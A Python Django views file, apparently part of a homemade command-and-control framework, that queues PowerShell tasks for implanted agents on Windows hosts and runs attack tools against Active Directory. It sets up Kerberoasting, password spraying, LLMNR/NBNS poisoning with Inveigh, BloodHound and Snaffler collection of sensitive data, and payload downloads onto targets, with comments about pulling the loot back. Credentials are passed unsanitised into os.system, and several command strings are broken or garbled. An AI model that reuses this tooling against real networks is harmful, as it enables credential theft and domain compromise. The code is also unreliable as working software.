import os
from blog.views import *
from blog.models import *

current_path= os.path.dirname(os.path.abspath(__file__))

#### we need to download modules & tools from ../general/ on the windows machine






def linkedin_users(request, agent='' , comp='', linkedin_mail='' , linkedin_password=''):
    if request.method=='POST':   
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============linkedin_users===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/linkedin2username/linkedin2username.py -c {comp} -u {linkedin_mail} -p {linkedin_password} -o {result_dir}".format(result_path,comp,linkedin_mail,linkedin_password,result_dir))
    else:
        return render(request, 'blog/listeners.html')


######  [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"        # to invoke-webrequest
#enum
def SPNUsersforKerb(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============Accounts for Kerb===============";import-module $env:USERPROFILE\powerview.ps1;Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def EnumSMBShares(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        ip = request.POST['ip']
        username = request.POST['username']
        password = request.POST['password']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============EnumShares===============' >> {result_path};crackmapexec smb {ip} -u {username} -p {password} --shares >> {result_path};".format(result_path,ip,username,password))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def TestingCreds_onDC(request, agent='' , ip='' , username='', password='' ):
    if request.method=='POST':
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============Testing Credentials===============' >> {result_path};crackmapexec smb {ip} -u {username} -p {password} >> {result_path}".format(result_path,ip,username,password))
    else:
        return render(request, 'blog/listeners.html')


#enum
#crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
def userenum_withcreds(request, agent='' , ip='' , username='', password='' ):
    if request.method=='POST':
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============CME Users===============\nOutPut in the following path:\n{result_dir}' >> {result_path};crackmapexec smb {ip} -u {username} -p {password} --users > {result_dir}CMEUsers".format(result_dir,result_path,ip,username,password))
    else:
        return render(request, 'blog/listeners.html')


#enum
def ACC_listing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============useraccount list===============";wmic useraccount list /format:list'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def Adapter(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============ipconfig /all===============";ipconfig /all'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    
#enum
def fbing(request, agent='' , iprange=''):
    if request.method=='POST':
        result_path = "../data/listeners/agents/{}/results".format(agent)
        os.system("echo '===============FPING O/P===============' >> {result_path};fping -asgq {iprange} >> {result_path} ".format(iprange,result_path))
    else:
        return render(request, 'blog/listeners.html')

        
#enum
def ArpTable(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============arp -a===============";arp -a'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


#enum
def DefenseCheck(request, url='', outpath=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============FireWall===============";netsh advfirewall show allprofiles;echo "===============Windows Defender status===============";sc query windefend;echo "===============Antimalware status===============";Get-MpComputerStatus'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


#enum
def systeminfo(request, url='', outpath=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============systeminfo===============";systeminfo'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def DomainInfo(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============Get-ADDomain===============";Get-ADDomain'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


#enum    
def DomainUsers(request, domain=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============USERS===============";Get-ADUser -Filter * | select UserPrincipalName;'.format(domain)
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def DomainControllers(request, domain=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============Domain Controllers===============";import-module $env:USERPROFILE\powerview.ps1;get-domaincontroller -domain {}'.format(domain)
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


#enum
def EnvValue(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============Environment values===============";Get-ChildItem Env: | ft Key,Value'       
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    
#enum
def GroupsListing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============group list===============";wmic group list /format:list'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    
#enum
def Groups(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============Get-ADGroup *===============";Get-ADGroup -Filter * | select name'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    

#enum
def groupInfo(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        group = request.POST['group']
        task = 'import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;echo "===============Get-ADGroup===============";Get-ADGroup -Identity "{group}";echo "===============Get-DomainGroupMember===============";Get-ADGroupMember -Identity "{group}" '.format(group)
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')

#enum
def GroupMembers(request, agent='', groupname=''):
    if request.method=='POST':
        task = 'echo "===============Group Members===============";Get-ADGroupMember -Identity "{}"'.format(groupname)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()

    else:
        return render(request, 'blog/listeners.html')


#enum    
def HotFixes(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============Hot Fixes===============";wmic qfe get Caption,Description,HotFixID,InstalledOn'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum    
def Ip4Route(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============IPv4 routing table===============";route print -4'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

#enum  
def ListExecPolicies(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============Get-ExecutionPolicy===============";Get-ExecutionPolicy -List'       
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def ListingModules(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============Get-Module===============";Get-Module'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def ImportModule(request, agent='', module=''):
    if request.method=='POST':
        task = 'import-module {}'.format(module)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')


#enum    
def loggedinUsers(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============Logged-in users ===============";qwinsta'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    

#enum    
def LocalAccListing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============System(local) accounts list===============";wmic sysaccount list /format:list'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def TrustRelations(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============TrustRelationships===============";import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;Get-ADTrust -Filter *'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
#powerview
def TrustMap(request, agent=''):
    if request.method=='POST':
        task = 'echo "===============Get-DomainTrustMapping===============";import-module $env:USERPROFILE\powerview.ps1;Get-DomainTrustMapping'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')

##download on target    
def DownloadonWindows(request, url='', outpath=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = '[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";iwr -Uri {} -OutFile {}'.format(url, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def sharp(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        username = request.POST['username']
        password = request.POST['password']
        DCip = request.POST['DCip']
        DomainName = request.POST['DomainName']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"        
        os.system("echo '===============SharpHound===============\nOutPut in the following path:\n{result_dir}' >> {result_path};cd {result_dir};bloodhound-python -u '{username}' -p '{password}' -ns {DCip} -d {DomainName} -c all --zip".format(result_dir,result_path,username,password,DCip,DomainName))
    else:
        return render(request, 'blog/listeners.html')

#sensitive data collector
def snaffler(request, url='', outpath=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "===============Snaffler==============="\nOutPut in the following path:\n$env:USERPROFILE;.\$env:USERPROFILE\snaffler.exe -s -d {} -o $env:USERPROFILE\output.log -v data'.format(url, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def DowngradePS(request):
    if request.method=='POST':
        agent = request.POST['agent']
        version = request.POST['version']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task='powershell -version {}'.format(version)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def processes(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task='echo "===============Processes===============";wmic process list /format:list'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def Dsquery(request):
    if request.method=='POST':
        arg = request.POST['arg']
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task='echo "===============DSquery===============";dsquery {}'.format(arg)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')



def TGStickets_usingGetSPNusers(request):
    if request.method=='POST':
        DCip = request.POST['DCip']
        domain = request.POST['domain']
        username = request.POST['username'] #optional
        password = request.POST['password'] #optional
        username = request.POST['DCip'] #optional
        aeskey = request.POST['hexkey'] #optional
        hashes= request.POST['hashes'] #optional
        agent = request.POST['agent']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        if username != '':
            os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain}/{username}:{password} -o {result_dir}TGStickets -request".format(result_dir,result_path,username,password,domain,DCip))
        else:
            if hashes != '':
                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain} -hashes {hashes} -o {result_dir}TGStickets -request".format(result_dir,result_path,hashes,domain,DCip))

            else:
                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain} -aeskey {aeskey} -o {result_dir}TGStickets -request".format(result_dir,result_path,aeskey, domain,DCip))
    
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


#powerview    
def test_localAdmin(request, agent='', compName='', user='', password='', domain=''):
    if request.method=='POST':
        if user == '':
            task = 'echo "===============Test-AdminAccess===============";import-module $env:USERPROFILE\powerview.ps1;Test-AdminAccess -ComputerName {}'.format(compName)    
            task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
            with open(task_path, "w") as f:
                f.write(task)
                f.close()
        else:
            task = 'echo "===============Test-AdminAccess===============";import-module $env:USERPROFILE\powerview.ps1;$SecPassword = ConvertTo-SecureString "{password}" -AsPlainText -ForceGet-DomainTrustMapping;$Cred =New-Object System.Management.Automation.PSCredential("{domain}\{user}", $SecPassword);Test-AdminAccess -ComputerName {compName} -Credential $Cred'.format(password,domain,user,compName)    
            task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
            with open(task_path, "w") as f:
                f.write(task)
                f.close()
    else:
        return render(request, 'blog/listeners.html')

#enum
def usercommand_history(request):
    if request.method=='POST':
        user = request.POST['user']
        agent = request.POST['agent']
        if user=='':  #user field is optional
            task = 'echo "===============Specified user history===============";Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt' 
        else:
            task = 'echo "===============Specified user history===============";Get-Content C:/users\{}\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt'.format(user)      
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')


#enum
# kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
def KerpUserEnum(request, agent='' , domain='', dc_ip='', users_list=''):
    if request.method=='POST':
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{result_dir}' >> {result_path};kerbrute userenum -d {domain} --dc {dc_ip} {users_list} | cut -d ':' -f 4 | sed 's/ //g' >> {result_dir}KerpUserEnum ".format(domain,dc_ip,users_list,result_path))
    else:
        return render(request, 'blog/listeners.html')

#enum
def GPO_windapsearch(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        DCip = request.POST['DCip']
        username = request.POST['username']
        password = request.POST['password']
        result_path = current_path+"/../../data/listeners/agents/{}/results".format(agent)
        os.system("echo '===============GPO_windapsearch===============' >> {result_path};python  ../general/windapsearch/windapsearch.py --dc-ip {ip} -u {username} -p {password} --gpos >> {result_path}  ;".format(DCip,username,password,result_path))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def pass_spray(request, agent='', password=''):
    if request.method=='POST':
        task = 'echo "===============Password Spraying===============\nOutPut in the following path:\n$env:USERPROFILE";import-module $env:USERPROFILE\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -Password {} -OutFile $env:USERPROFILE\spray_success -ErrorAction SilentlyContinue -Force'.format(password)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')        

def llmnr_poison(request, agent='', time=0):
    if request.method=='POST':
        task = 'echo "===============Inveigh starting===============";import-module $env:USERPROFILE\inveigh.ps1;Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -RunTime {}'.format(time)
        #####then send the inveigh logs ($env:USERPROFILE\Inveigh-*) files to our machine
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')

def pass_policy(request, agent=''):
    if request.method=='POST':
        task = 'echo "===============Password Policy===============";net accounts /DOMAIN'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')


def set_execPolicy(request, agent='',policy='',scope=''):
    if request.method=='POST':
        task = 'echo "===============Set-ExecutionPolicy===============";Set-ExecutionPolicy {} -Scope {}'.format(policy,scope)       
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()

    else:
        return render(request, 'blog/listeners.html')

def snaffler(request, agent='', domain=''):
    if request.method=='POST':
        task = 'echo "===============Snaffler===============\nOutPut in the following path:\n$env:USERPROFILE";$env:USERPROFILE\Snaffler.exe -d {} -o snaffler.log -v data'.format(domain)       
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
#### we need to get snaffler.log on our machine
    else:
        return render(request, 'blog/listeners.html')
